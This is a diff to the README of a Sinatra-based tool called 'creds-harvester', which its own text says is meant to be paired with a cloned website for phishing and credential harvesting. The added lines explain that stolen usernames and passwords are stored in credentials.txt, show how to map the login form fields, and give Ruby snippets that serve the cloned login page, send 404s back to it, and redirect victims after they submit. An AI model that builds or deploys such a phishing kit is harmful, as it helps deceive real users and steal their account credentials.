@@ -1,5 +1,7 @@
 # creds-harvester
-A simple script to use with cloned website for phishing and credentials harvesting
+A simple script to use with cloned website for phishing and credentials harvesting.
+
+Collected Credentials will be stored in `credentials.txt` file. The `credentials.txt` is not accessable publicly as there is no route to it, test it.
 
 ## Requirements 
 This script uses Sinatra framework as web application server. I also recommend to use `rerun` command to run the code as `rerun` watches the chanes on the file and restart it again, so you don't have to interrupt the service.
@@ -46,6 +48,30 @@ Go edit `login.rb` script and add the parameter ID's
 ```ruby
 username = params['UserName']
 password = params['Password']
+```
+
+**The Main page**
+
+Specify the main page file from within `views` directory. No need to include views directory as it's already included.
+
+```ruby
+erb 'PATH/TO/LOGIN_PAGE'.to_sym
+```
+
+**Redirect 404**
+
+You can redirect the users to the main page if visited not found pages
+```ruby
+not_found do
+  redirect '/'.to_sym
+end
+```
+
+**Redirect after submitting**
+
+Also, you can redirect the users once they submit their credentials to the cloned website or other of your choice.
+```
+redirect 'https://google.com'
 ```
 
 #### Step #4
